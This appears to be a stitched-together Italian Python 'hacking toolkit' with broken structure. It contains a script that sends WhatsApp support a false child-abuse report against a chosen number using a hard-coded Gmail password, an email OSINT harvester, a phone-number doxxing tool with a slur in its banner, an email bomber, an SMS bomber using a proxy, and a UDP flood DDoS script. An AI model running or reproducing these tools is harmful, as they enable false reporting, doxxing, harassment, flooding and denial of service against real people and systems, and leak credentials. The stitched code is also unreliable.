print ('╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝')
print ('                                                     ')

#banner by
print ('█▀▀▄ █░░█ 　 █▀▀ █░░ █▀▀█ █░░█ █▀▀ █▀▀█ ')
print ('█▀▀▄ █▄▄█ 　 ▀▀█ █░░ █▄▄█ █▄▄█ █▀▀ █▄▄▀ ')
print ('▀▀▀░ ▄▄▄█ 　 ▀▀▀ ▀▀▀ ▀░░▀ ▄▄▄█ ▀▀▀ ▀░▀▀ ')



#auto

a = input('Numero da bannare:')

#email
def enviar_email():
    corpo_email = f'Olá suporte do whatsapp, sou mãe de um menino que foi abusado virtualmente por este numero {a} meu filho nao foi o unico!!'
    
 
    msg = email.message.Message()
    msg['Subject'] = 'Olá suporte do whatsapp!'
    msg['From'] = 'slayerandkr@gmail.com'
    msg['To'] = 'support@whatsapp.com'
    password = 'llqeiynzlzneozlu'
    msg.add_header ('Content-Type', 'text/html')
    msg.set_payload(corpo_email )
#login
    s = smtplib.SMTP('smtp.gmail.com: 587')
    s.starttls()
    # Login Credentials for sending the mail
    s.login(msg['From'], password)
    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))
    print('il numero sara bannato a breve.')

enviar_email()

if auto == 6:
   #!/usr/bin/env python
# -*- coding:utf-8 -*- 
#
# nome   : Email OSINT
# url creator    : https://github.com/jesvs-axis
# creator : Axis

      import sys
import json
import getopt
# infoga.lib
from lib.check import *
from lib.output import *
from lib.banner import Banner
# infoga.recon
from recon.ask import *
from recon.baidu import *
from recon.bing import *
from recon.pgp import *
from recon.yahoo import *
from recon.dogpile import *
from recon.exalead import *
from recon.google import *
from recon.mailtester import *
from lib.output import PPrint

class infoga(object):
	""" infoga """
	def __init__(self):
		self.verbose = 1
		self.domain = None
		self.breach = False
		self.source = "all"
		self.listEmail = []
		self.report = None

	def search(self,module):
		emails = module.search()
		if emails != ([] or None):
			for email in emails:
				if email not in self.listEmail:
					self.listEmail.append(email)
			if self.verbose in (1,2,3):
				info('Found %s emails in %s'%(len(emails),
					module.__class__.__name__))

	def engine(self,target,engine):
		engine_list = [ Ask(target),Baidu(target),Bing(target),Dogpile(target),
						Exalead(target),Google(target),PGP(target),Yahoo(target)
						]
		if engine == 'all':
			for e in engine_list: self.search(e)
		else:
			for e in engine_list:
				if e.__class__.__name__.lower() in engine:self.search(e)

	def tester(self,email):
		return MailTester(email).search()

	def main(self):
		if len(sys.argv) <= 2:Banner().usage(True)
		try:
			opts,args = getopt.getopt(sys.argv[1:],'d:s:i:v:r:hb',
				['domain=','source=','info=','breach','verbose=','help','report='])
		except Exception as e:
			Banner().usage(True)
		Banner().banner()
		for o,a in opts:
			if o in ('-d','--domain'):self.domain=checkTarget(a)
			if o in ('-v','--verbose'):self.verbose=checkVerbose(a)
			if o in ('-s','--source'):self.source=checkSource(a)
			if o in ('-b','--breach'):self.breach=True
			if o in ('-r','--report'):self.report= open(a,'w') if a != '' else None
			if o in ('-i','--info'):
				self.listEmail.append(checkEmail(a))
				plus('Searching for: %s'%a)
			if o in ('-h','--help'):Banner().usage(True)
		### start ####
		if self.domain != ('' or None):
			if self.source == 'ask':self.engine(self.domain,'ask')
			if self.source == 'all':self.engine(self.domain,'all')
			if self.source == 'google':self.engine(self.domain,'google')
			if self.source == 'baidu':self.engine(self.domain,'baidu')
			if self.source == 'bing':self.engine(self.domain,'bing')
			if self.source == 'dogpile':self.engine(self.domain,'dogpile')
			if self.source == 'exalead':self.engine(self.domain,'exalead')
			if self.source == 'pgp':self.engine(self.domain,'pgp')
			if self.source == 'yahoo':self.engine(self.domain,'yahoo')

		if self.listEmail == [] or self.listEmail == None:
			sys.exit(warn('Not found emails... :(')) 
		
		for email in self.listEmail:
			ip = self.tester(email)
			if ip != ([] or None):
				ips = []
				for i in ip:
					if i not in ips:ips.append(i)
				if len(ips) >=2:
					info("Found multiple ip for this email...")
				PPrint(ips,email,self.verbose,self.breach,self.report).output()
			else:more('Not found any informations for %s'%(email))
		if self.report != None:
			info('File saved in: '+self.report.name)
			self.report.close()
		# end
if __name__ == "__main__":
	try:
		infoga().main()
	except KeyboardInterrupt as e:
		sys.exit(warn('Exiting...'))

                
if auto == 7:

    
    
  import os, time as t
os.system("clear")
try:
    import colorama
    import pyfiglet
    import phonenumbers
except ModuleNotFoundError:
    print("\033[1;31;40m Manca qualcosa!\n\nRun \"pip install -r requirements.txt\" then run \"python3 phonenumber_osint.py \"\033[1;37;40m" )
    t.sleep(2)
    exit()
from colorama import *
from phonenumbers import geocoder, carrier, timezone
colorama.init(autoreset=True)
print(Fore.RED + "Nota: FOTTI LO SKID CHE DEVI DOXXARE \n\nRicordati di essere gentile\'mentre doxxi sto frocio🌚🌚🌝")
t.sleep(5)
os.system("clear")
def loop():
    os.system("clear")
    head = pyfiglet.figlet_format("NumeroDiTelefono-OSINT")
    print (Fore.YELLOW + head)
    print(Fore.RED + " Versione 1.0".center(60))
    print(Fore.YELLOW + "[+] " + Fore.GREEN + "Tool Name:Numero OSINT By Axis\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "Creator: Axis\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "Versione:1.0\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "TikTok: tiktok.com/@axis.fn\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "Github:https://github.com/jesvs-axis\n" + Fore.YELLOW + "[+] " + Fore.GREEN + "WhatsApp:+393714277865")
    print(Fore.RED + ">>>>>>>>>>>>>>>>>>>>>>>>>>>>" + Fore.CYAN + "Scegli un opzione valida" + Fore.RED + "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<")
    print(Fore.BLUE + """
[1] Prendi info basic sul numero di telefono
[2] Prendi ISP del numero di telefono
[3] Estrai numero di telefono e salvalo
[4] Numero di telefono validator
[5] Aggiorna programma
[6] Exit Program
""")
    try:
        option = int(input (Fore.YELLOW + Back. RED + "Scegli " + Style.RESET_ALL))
    except ValueError:
        print(Fore.RED + "Solo numeri interi!")
        t.sleep(2)
        loop()
    if option == 1:
        PhoneNumber = input(Fore.GREEN + "Scrivi il numero di telefono includendo il prefisso: " + Style.RESET_ALL)
        try:
            parse = phonenumbers.parse(PhoneNumber)
        except:
            print (Fore.RED + "AGGIUNGI IL PREFISSO! ")
            t.sleep(3)
            loop()
        region = geocoder.description_for_number(parse, 'en')
        tiimezone = timezone.time_zones_for_number(parse)
        os.system("clear")
        print(Fore.YELLOW + "Getting basic informations from " + PhoneNumber)
        t.sleep(3)
        print(Fore.GREEN + "Il numero di telefono analizzato : " + Fore.CYAN, parse)
        print( Fore.GREEN + "Lo stato del numero di telefono: " + Fore.CYAN, region)
        print(Fore.GREEN + "L'ora del paese del numero : " + Fore.CYAN, tiimezone)
    elif option == 2:
         PhoneNumber = input(Fore.GREEN + "Numero di telefono con prefisso: " + Style.RESET_ALL)
         try:
             parse = phonenumbers.parse(PhoneNumber)
         except:
             print (Fore.RED + "AGGIUNGI IL PREFISSO!")
             t.sleep (2)
             loop()
         varrier = carrier.name_for_number(parse, 'en')
         print(Fore.GREEN + "L'operator del numero (ISP) : " + Fore.CYAN , varrier)
    elif option == 3:
        os.system("clear")
        print(Fore.BLUE + """
[1] Metti un file
[2] Incolla un txt
""")
        try:
            file = int(input (Fore.YELLOW + Back. RED + "Scegli un opzione valida: " + Style.RESET_ALL))
        except ValueError:
            print(Fore.RED + "SOLO NUMERI INTERI!")
            t.sleep(2)
            loop()
        if file == 1:
           contact_filename  = input("\n" + Fore.YELLOW + Back.RED + "Uploadda il tuo file qua [Incolla il percorso]: " + Style.RESET_ALL)
           try:
               filename = open(contact_filename, "rt")
           except:
               print(Fore.RED + " Il file non esiste o il percorso e' errato!")
               t.sleep(2)
               exit()

           country_code = input(Fore.GREEN + "Prefisso del numero da estrarre: " + Style.RESET_ALL)
           if "+" not in country_code[0]:
               print (Fore.RED + "Aggiungi \"+\" prima del prefisso ! ")
               t.sleep(2)
               loop()
           saving_directory = input (Fore.GREEN + "Nome del file: " + Fore.GREEN).strip()
           phone_number_file = phonenumbers.PhoneNumberMatcher (str(filename.read()), country_code)
           global extracting
           extracting = ""
           #global z
#           z = str(extracting)
           print(Fore.CYAN + "\n\nEstraendo il numero ")
           for  extracting in phone_number_file:
               if country_code in str(extracting):
                   print(Fore.YELLOW + str(extracting))
                   z = str(extracting)
                   extracted_numbers = open(saving_directory + ".txt", "a")
                   
                   
                   extracted_numbers.write(z + "\n")
                   extracted_numbers.close()
                   print(Fore.GREEN + "\n\n\nIl file e' stato salvato come " + saving_directory + ".txt")

           
         #  if len(z) != 0:

           if len(str(extracting)) == 0:
               print(Fore.RED + "Il tool non e' riuscito ad estrarre info dal numero di telefono perch' non appare nei file o il prefisso e' errato")
           elif country_code not in  str(extracting):
               print(Fore.RED + "Impossibile trovare un prefisso uguale")
               t.sleep(2.4)
        elif file == 2:
            reg = ""
            text = input(Fore.GREEN + "Incolla il tuo testo qua: " + Style.RESET_ALL)
            phone = phonenumbers.PhoneNumberMatcher(text, reg)
            global PhoneNumbers
            PhoneNumbers = ""
            print(Fore.BLUE + "Estraendo numeri di telefono dal testo\n\n")
            for PhoneNumbers in phone:
                
                print(Fore.YELLOW + str(PhoneNumbers)) 
            if len(str(PhoneNumbers)) == 0:
                 print(Fore.RED + "Il tool non e' riuscito ad estrarre info dal numero di telefono perch' non appare nei file o il prefisso e' errato")
        else:
            print (Fore.RED + "Opzione non valida")
            t.sleep (2)
            loop()
    elif option == 4:
         PhoneNumber = input(Fore.GREEN + "Scrivi il numero con prefisso: " + Style.RESET_ALL)
         try:
             parse = phonenumbers.parse(PhoneNumber)
         except:
             print(Fore.RED + "Aggiungi il prefisso!")
             t.sleep(3)
             loop()
         ValidNumber = phonenumbers.is_valid_number(parse)
         if ValidNumber is True:
             print(Fore.GREEN + PhoneNumber + " is " + Fore.CYAN + "valid")
         else:
             print(Fore.GREEN + PhoneNumber + " is " + Fore.RED + "not valid")
    elif option == 5:
         os.system("clear")
         print(Fore.GREEN + "AGGIORNANDO...")
         t.sleep(2)
         os.system("""
         cd $HOME
         rm -rf PhoneNumber-OSINT
         git clone https://github.com/spider863644/PhoneNumber-OSINT""")
         print(Fore.BLUE + """
         type
         cd $HOME
         cd PhoneNumber-OSINT
         python3 phonenumber_osint.py
         """)
         exit()
    elif option == 6:
        print(Fore.GREEN + """



    """)
    cont = input(Fore.YELLOW + Back.RED + "Vuoi continuare?[n/s]: " + Style.RESET_ALL)
    if cont == "S" or cont == "s":
        loop()
loop()

if auto == 8:
    #// NON DIMENTICARE DI SEGUIRMI SU TIKTOK E INSTAGRAM... :)
# Ma seriamente, fallo per non perderti altri tools sgravati! 


    
    
    
    '''imports'''
import smtplib
import sys


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ made with love by Axis ]+]+]+')
    print(bcolors.GREEN + '''
                     \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|              Author: Axis
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' ''')


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Iniziando il tool ]+]+]+')
            self.target = str(input(bcolors.GREEN + 'Email della vittima <: '))
            self.mode = int(input(bcolors.GREEN + 'Modalita del bombing (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Opzione non valida. Ciao.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Installando la bomba ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Scegli un quantitativo personalizzato <: '))
            print(bcolors.RED + f'\n+[+[+[ Hai selezionato BOMB mode: {self.mode} e {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Settando email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Scrivi il dominio della mail | o seleziona delle opzioni prefabbricate - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Numero port <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Inserisci email <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Inserisci password <: '))
            self.subject = str(input(bcolors.GREEN + 'Oggetto mails <: '))
            self.message = str(input(bcolors.GREEN + 'Testo mails <: '))

            self.msg = '''Da: %s\nA: %s\nOggetto %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'BOMBING: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacco mail by Axis... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Skid morto | attacco finito ]+]+]+')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
    if auto == 9:
        import requests
import services

# colours
green     = '\033[92m'
cyan      = '\033[95m'
bold      = '\033[1m'
underline = '\033[4m'
end       = '\033[0m'
red       = '\033[91m'

# header
print(f"{green}{bold}\t\t{underline}[AXIS SMS KILLER V1.0]{end}")

print()
print(f"{bold}coddato da{end}", end="")
print(f"{green}{bold} >> {end}", end="")
print(f"{cyan}{bold}Axis{end}")

print(f"{bold}TikTok{end}", end="")
print(f"{green}{bold} >> {end}", end="")
print(f"{cyan}{bold}@axis.fn{end}")
print()

# inputs
print('inserisci il numero con o senza prefisso (+39) (39)\nesempio: +393714277865')
input_number = input(green + bold + ">> " + end)
print('quanti sms deve mandare il tool?')
sms = int(input(green + bold + ">> " + end))

print(f"ti serve un{cyan} tor {end}y/n? ")
is_tor = input(bold + green + ">> " + end)


def parse_number(number):
	msg = f"[*]controllo numero - {green}{bold}OK{end}"
	if len(number) in (10, 11, 12):
		if number[0] == "39":
			number = number[1:]
			print(msg)
		elif number[:2] == "+39":
			number = number[2:]
			print(msg)
		elif int(len(number)) == 10 and number[0] == 9:
			print(msg)
	else:
		print(f"[*]controllo numero - {red}{bold}numero sbagliato!{end}\nATTENZIONE questo bomber e' fatto per uccidere solo skids!")
		quit()
	return number
number = parse_number(input_number)

# tor
if str(is_tor) == "y":
        print(f"[*]avvia {cyan}{bold}Tor{end}...")
        proxies = {
            'http': 'socks5://139.59.53.105:1080',
            'https': 'socks5://139.59.53.105:1080'
        }
        tor = requests.get('http://icanhazip.com/', proxies=proxies).text
        tor = (tor.replace('\n', ''))
        print(f"[*]launch {cyan}{bold}Tor{end} - {green}{bold}OK{end}")

services.attack(number, sms)

if auto == 10:
    import sys
import socket
import threading
import time as clock

host = str(sys.argv[1])
port = int(sys.argv[2])
time = int(sys.argv[3])
method = str(sys.argv[4])

def flood_udp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * 373)
    except: return s.close()

def power_udp():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * 730)
    except: return s.close()

def udp_mix():
    try:
        threading.Thread(target=power_udp, daemon=True).start()
        threading.Thread(target=flood_udp, daemon=True).start()
    except: return

def attack_hq(timeout):
    while True:
        if clock.time() > timeout: exit()
        if clock.time() < timeout: clock.sleep(0.1)

def saphyra():
    global method
    timeout = clock.time() + time
    if method == "UDP-FLOOD":
        for sequence in range(1000):
            threading.Thread(target=flood_udp, daemon=True).start()
    if method == "UDP-POWER":
        for sequence in range(1000):
            threading.Thread(target=power_udp, daemon=True).start()
    if method == "UDP-MIX":
        for sequence in range(1000):
            threading.Thread(target=udp_mix, daemon=True).start()
    attack_hq(timeout)
saphyra()